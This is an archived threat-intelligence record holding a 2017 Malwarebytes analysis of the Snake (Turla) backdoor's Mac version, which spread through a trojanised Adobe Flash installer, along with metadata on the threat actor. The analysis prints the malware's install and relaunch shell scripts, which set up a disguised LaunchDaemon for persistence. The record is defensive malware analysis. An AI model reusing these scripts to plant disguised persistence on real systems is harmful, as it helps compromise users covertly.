{
    "id": "f94f3caa-94c5-49dd-b8d3-5c0081e1da61",
    "created_at": "2023-01-12T15:02:12.43793Z",
    "updated_at": "2025-03-27T02:16:20.817468Z",
    "deleted_at": null,
    "sha1_hash": "a7601ed97e267d104a1eb0dc630c1f47f0846511",
    "title": "2017-05-05 - Snake malware ported from Windows to Mac",
    "authors": "",
    "file_creation_date": "2022-05-28T17:59:30Z",
    "file_modification_date": "2022-05-28T17:59:30Z",
    "file_size": 639323,
    "plain_text": "# Snake malware ported from Windows to Mac\n\n**[blog.malwarebytes.com/threat-analysis/2017/05/snake-malware-ported-windows-mac/](https://blog.malwarebytes.com/threat-analysis/2017/05/snake-malware-ported-windows-mac/)**\n\nThomas Reed May 5, 2017\n\nSnake, also known as Turla and Uroburos, is backdoor malware that has been around and\ninfecting Windows systems since at least 2008. It is thought to be Russian governmental\nmalware and on Windows is highly-sophisticated. It was even seen infecting Linux systems\nin 2014. Now, it appears to have been ported to Mac.\n\n[Fox-IT International wrote about the discovery of a Mac version of Snake on Tuesday. It’s not](https://blog.fox-it.com/2017/05/03/snake-coming-soon-in-mac-os-x-flavour/)\nknown at this point how Snake is spread, although the fact that it imitates an Adobe Flash\nPlayer installer suggests a not-very-sophisticated method. (I mean, come on, there are other\npieces of software out there! Why are the bad guys so hung up on Flash installers?)\n\n## Distribution method\n\nThe malware was found in a file named Install Adobe Flash Player.app.zip. The app inside\nthe .zip file would appear to be a legit Adobe Flash Player installer. The app is signed,\nhowever, by a certificate issued to an “Addy Symonds” rather than Adobe, but the average\nuser is never going to know that… as long as it’s signed, Apple’s Gatekeeper system will\nallow it, when set to its default settings.\n\n\n-----\n\nIf the app is opened, it will immediately ask for an admin user password, which is typical\nbehavior for a real Flash installer. If such a password is provided, the behavior continues to\nbe consistent with the real thing.\n\nProceeding through the installation to the end will display no suspicious behavior and in the\nend, Flash will actually be installed. This is a significant break from other fake Flash\ninstallers, which at best download the real Flash installer and open it separately after\nproceeding through a completely unconvincing fake install process.\n\nIt turns out that this is because the app incorporates a real Flash installer. The app has a\nrather strange internal structure, lacking the normal structure of an application bundle on\nmacOS. It works, though.\n\n\n-----\n\nWhen the app runs, a malicious executable named Install – also code-signed by Addy\nSymonds – runs first. That process, in turn, executes an included shell script named\n_install.sh:_\n```\n#!/bin/sh\nSCRIPT_DIR=$(dirname \"$0\")\nTARGET_PATH=/Library/Scripts\nTARGET_PATH2=/Library/LaunchDaemons\ncp -f \"${SCRIPT_DIR}/queue\" \"${TARGET_PATH}/queue\"\ncp -f \"${SCRIPT_DIR}/installdp\" \"${TARGET_PATH}/installdp\"\ncp -f \"${SCRIPT_DIR}/installd.sh\" \"${TARGET_PATH}/installd.sh\"\ncp -f \"${SCRIPT_DIR}/com.adobe.update\" \"$TARGET_PATH2/com.adobe.update.plist\"\n\"${TARGET_PATH}/installd.sh\"\n\"${SCRIPT_DIR}/Install Adobe Flash Player\"\nexit $RC\n\n```\nThis script installs the following components of the malware:\n```\n/Library/Scripts/queue\n/Library/Scripts/installdp\n/Library/Scripts/installd.sh\n/Library/LaunchDaemons/com.adobe.update.plist\n\n```\nNext, the script opens the installd.sh shell script then launches the real Install Adobe Flash\n_Player process, which performs the actual installation of Flash. By the time the Flash installer_\ninterface appears, the machine is already infected.\n\n\n-----\n\nThe installd.sh script, which is also run by the installed launch daemon, simply checks to see\nif the malicious installdp process is running and if it isn’t, launches it.\n```\n#!/bin/bash\nSCRIPT_DIR=$(dirname \"$0\")\nFILE=\"${SCRIPT_DIR}/queue#1\"\nPIDS=`ps cax | grep installdp | grep -o '^[ ]*[0-9]*'`\nif [ -z \"$PIDS\" ]; then\n${SCRIPT_DIR}/installdp ${FILE} n\nfi\nexit $RC\n\n```\nAt this point, once installdp is running, the malware is fully functional, providing a backdoor\ninto the Mac, configured according to the data found in the queue file.\n\n## Impact\n\nIn all, this is one of the sneakier bits of Mac malware lately. Although it’s still “just a Trojan,”\nit’s a quite convincing one if distributed properly. Although Mac users tend to scoff at Trojans,\nbelieving them to be easy to avoid, this is not always the case.\n\nTrojans can be effective even when they’re junk and the social engineering behind them is\npoor. Consider how bad it would be if someone were to receive this file in a convincing\nspoofed e-mail, supposedly from their IT department or a close friend, telling them to install it\nimmediately due to a recent Flash vulnerability! As a spear phishing attack, this could be\nused with devastating effect.\n\nFurther, the installed components of the malware are quite effective as well. Few people\neven know that the /Library/Scripts/ folder exists, so that’s a moderately safe place to dump a\npayload (although there are better options). The launch daemon is quite unremarkable since\nanyone with Adobe software will have other Adobe launch agents or daemons installed. The\naverage person won’t know this one isn’t legitimate.\n\nFortunately, Apple revoked the certificate very quickly, so this particular installer is no further\ndanger unless the user is tricked into downloading it via a method that doesn’t mark it with a\n[quarantine flag (such as via most torrent apps). Malwarebytes for Mac will detect it as](https://malwarebytes.com/mac)\nOSX.Snake and removal, in this case, is a breeze.\n\nIf you’re infected, however, as with any backdoor, it’s important to keep in mind that data may\nhave been stolen, including passwords and any unencrypted files on the hard drive. Keep in\nmind that, even if you use File Vault, the files are decrypted as long as you’re logged in, so\nthis doesn’t really count.\n\nAfter removing the malware (and restarting the computer), change your passwords and\nmake sure that you’ve taken any other necessary steps to mitigate damage due to the\npossibility of exfiltrated data. And, as always, if this is a business machine, contact IT so they\nknow about the issue and can take any necessary measures to mitigate risk to the company\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-05-05 - Snake malware ported from Windows to Mac.pdf"
    ],
    "report_names": [
        "2017-05-05 - Snake malware ported from Windows to Mac.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a97cf06d-c2e2-4771-99a2-c9dee0d6a0ac",
            "created_at": "2022-10-25T16:07:24.349252Z",
            "updated_at": "2025-03-27T02:02:10.184406Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "ATK 13",
                "Belugasturgeon",
                "Blue Python",
                "CTG-8875",
                "Group 88",
                "ITG12",
                "Iron Hunter",
                "Krypton",
                "Makersmark",
                "Operation Epic Turla",
                "Operation Moonlight Maze",
                "Operation Penguin Turla",
                "Operation Satellite Turla",
                "Operation Skipper Turla",
                "Operation Turla Mosquito",
                "Operation WITCHCOVEN",
                "Pacifier APT",
                "Pensive Ursa",
                "Popeye",
                "SIG15",
                "SIG2",
                "SIG23",
                "Secret Blizzard",
                "TAG-0530",
                "Turla",
                "UNC4210",
                "Venomous Bear",
                "Waterbug"
            ],
            "source_name": "ETDA:Turla",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "ATI-Agent",
                "AdobeARM",
                "Agent.BTZ",
                "Agent.DNE",
                "BigBoss",
                "COMpfun",
                "Chinch",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobra Carbon System",
                "ComRAT",
                "DoublePulsar",
                "EmPyre",
                "EmpireProject",
                "Epic Turla",
                "EternalBlue",
                "EternalRomance",
                "GoldenSky",
                "Group Policy Results Tool",
                "HTML5 Encoding",
                "HyperStack",
                "IcedCoffee",
                "IronNetInjector",
                "KSL0T",
                "Kapushka",
                "Kazuar",
                "KopiLuwak",
                "Kotel",
                "LOLBAS",
                "LOLBins",
                "LightNeuron",
                "Living off the Land",
                "Maintools.js",
                "Metasploit",
                "Meterpreter",
                "MiamiBeach",
                "Mimikatz",
                "MiniDionis",
                "Minit",
                "NBTscan",
                "NETTRANS",
                "NETVulture",
                "Neptun",
                "NetFlash",
                "NewPass",
                "Outlook Backdoor",
                "Penquin Turla",
                "Pfinet",
                "PowerShell Empire",
                "PowerShellRunner",
                "PowerShellRunner-based RPC backdoor",
                "PowerStallion",
                "PsExec",
                "PyFlash",
                "QUIETCANARY",
                "Reductor RAT",
                "RocketMan",
                "SMBTouch",
                "SScan",
                "Satellite Turla",
                "SilentMoon",
                "Sun rootkit",
                "TTNG",
                "TadjMakhal",
                "Tavdig",
                "TinyTurla",
                "TinyTurla Next Generation",
                "TinyTurla-NG",
                "Topinambour",
                "Tunnus",
                "Turla",
                "Turla SilentMoon",
                "TurlaChopper",
                "Uroburos",
                "Urouros",
                "WCE",
                "WITCHCOVEN",
                "WhiteAtlas",
                "WhiteBear",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Wipbot",
                "WorldCupSec",
                "XTRANS",
                "certutil",
                "certutil.exe",
                "gpresult",
                "nbtscan",
                "nbtstat",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8aaa5515-92dd-448d-bb20-3a253f4f8854",
            "created_at": "2024-06-19T02:03:08.147099Z",
            "updated_at": "2025-03-27T02:05:17.408118Z",
            "deleted_at": null,
            "main_name": "IRON HUNTER",
            "aliases": [
                "Belugasturgeon ",
                "Blue Python ",
                "CTG-8875 ",
                "ITG12 ",
                "KRYPTON ",
                "MAKERSMARK ",
                "Pensive Ursa ",
                "Secret Blizzard ",
                "Turla",
                "UAC-0003 ",
                "UAC-0024 ",
                "UNC4210 ",
                "Venomous Bear ",
                "Waterbug ",
                "ATK13 "
            ],
            "source_name": "Secureworks:IRON HUNTER",
            "tools": [
                " ComRAT",
                " Kazuar",
                " KopiLuwak",
                " LightNeuron",
                " Mosquito",
                " Nautilus",
                " Neuron",
                " Penquin",
                " PoisonFrog",
                " PyFlash",
                " Skipper",
                " Snake",
                " Tavdig",
                " TinyTurla",
                " Tunnus",
                "Carbon-DLL"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a97fee0d-af4b-4661-ae17-858925438fc4",
            "created_at": "2023-01-06T13:46:38.396415Z",
            "updated_at": "2025-03-27T02:00:02.823045Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Uroburos",
                "Hippo Team",
                "Pacifier APT",
                "MAKERSMARK",
                "ATK13",
                "UAC-0003",
                "IRON HUNTER",
                "Waterbug",
                "TAG_0530",
                "KRYPTON",
                "Popeye",
                "SIG23",
                "UAC-0144",
                "G0010",
                "Blue Python",
                "VENOMOUS Bear",
                "Group 88",
                "Pfinet",
                "ITG12",
                "UNC4210",
                "Secret Blizzard",
                "UAC-0024"
            ],
            "source_name": "MISPGALAXY:Turla",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535732,
    "ts_updated_at": 1743041780,
    "ts_creation_date": 1653760770,
    "ts_modification_date": 1653760770,
    "files": {
        "pdf": "https://archive.orkl.eu/a7601ed97e267d104a1eb0dc630c1f47f0846511.pdf",
        "text": "https://archive.orkl.eu/a7601ed97e267d104a1eb0dc630c1f47f0846511.txt",
        "img": "https://archive.orkl.eu/a7601ed97e267d104a1eb0dc630c1f47f0846511.jpg"
    }
}